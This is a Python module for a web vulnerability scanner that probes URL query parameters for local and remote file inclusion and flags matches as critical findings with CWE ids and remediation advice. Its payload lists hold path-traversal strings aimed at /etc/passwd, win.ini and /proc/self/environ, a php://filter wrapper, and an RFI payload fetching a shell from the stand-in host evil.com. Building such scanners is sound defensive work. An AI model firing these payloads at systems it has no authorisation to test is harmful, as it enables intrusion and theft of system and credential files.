"""
File Inclusion (LFI/RFI) vulnerability scanner module.
"""

import logging
import re
from collections.abc import Callable
from typing import Any
from urllib.parse import parse_qsl, urlencode, urlparse

from .base_scanner import BaseScanner

logger = logging.getLogger(__name__)


class LfiRfiScanner(BaseScanner):
    """Professional File Inclusion (LFI/RFI) assessment engine."""

    def __init__(self, config, http_client):
        super().__init__(config, http_client)
        self.name = "LfiRfiScanner"
        self.description = "Local and Remote File Inclusion detector"
        self.version = "3.1.0"
        self.capabilities = ["LFI", "RFI", "PHP Wrappers"]

        self.lfi_payloads = [
            "/etc/passwd",
            "../../../../../../../../etc/passwd",
            "C:\\windows\\win.ini",
            "..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
            "/proc/self/environ",
            "php://filter/convert.base64-encode/resource=index.php",
        ]

        self.rfi_payloads = ["http://evil.com/shell.txt", "https://pastebin.com/raw/test"]

        self.patterns = {
            "passwd": r"root:.*?:0:0:",
            "winini": r"\[fonts\]|\[extensions\]",
            "environ": r"PATH=|USER=",
            "base64": r"^[a-zA-Z0-9+/]*={0,2}$",
        }

    async def scan(self, url: str, progress_callback: Callable | None = None) -> dict[str, Any]:
        """Perform file inclusion assessment."""
        logger.info(f"Analyzing LFI/RFI for {url}")
        vulnerabilities = []

        try:
            self._update_progress(progress_callback, 10, "Extracting test points")
            test_points = await self._get_test_points(url)

            if not test_points:
                return self._format_result("Clean", "No injectable parameters found", [])

            all_payloads = self.lfi_payloads + self.rfi_payloads
            total_tests = len(test_points) * len(all_payloads)
            processed = 0

            for tp in test_points:
                for payload in all_payloads:
                    processed += 1
                    self._update_progress(
                        progress_callback,
                        10 + int((processed / total_tests) * 85),
                        f"Testing {tp['name']} with {payload}",
                    )

                    test_url = self._inject_payload(tp, payload)
                    response = await self.http_client.get(test_url)

                    if not response:
                        continue
                    content = await response.text()

                    # Detection logic
                    if any(re.search(p, content, re.I) for p in self.patterns.values()):
                        is_rfi = payload.startswith("http")
                        vuln_type = "rfi" if is_rfi else "lfi"

                        vulnerabilities.append(
                            self._create_vulnerability(
                                title=f"{vuln_type.upper()} Detected",
                                description=f"Potential {vuln_type.upper()} vulnerability found using payload: {payload}",
                                severity="critical",
                                type=vuln_type,
                                evidence={"parameter": tp["name"], "payload": payload},
                                cwe_id="CWE-98" if is_rfi else "CWE-22",
                                remediation="Do not allow dynamic file paths. Use a whitelist of allowed files or reference files by ID.",
                            )
                        )
                        break  # Move to next TP

            self._update_progress(progress_callback, 100, "completed")
            status = "Vulnerable" if vulnerabilities else "Clean"
            return self._format_result(
                status, f"Tested {len(test_points)} parameters. Found {len(vulnerabilities)} issues.", vulnerabilities
            )

        except Exception as e:
            logger.exception(f"LFI/RFI scan failed: {e}")
            return self._format_result("Error", f"Internal error: {e}", [])

    async def _get_test_points(self, url: str) -> list[dict[str, Any]]:
        """Identify injectable parameters."""
        points = []
        parsed = urlparse(url)
        params = parse_qsl(parsed.query)
        for name, _ in params:
            points.append({"name": name, "type": "query", "url": url})
        return points

    def _inject_payload(self, tp: dict[str, Any], payload: str) -> str:
        """Construct the URL with the payload."""
        parsed = urlparse(tp["url"])
        params = dict(parse_qsl(parsed.query))
        params[tp["name"]] = payload
        query = urlencode(params)
        return parsed._replace(query=query).geturl()
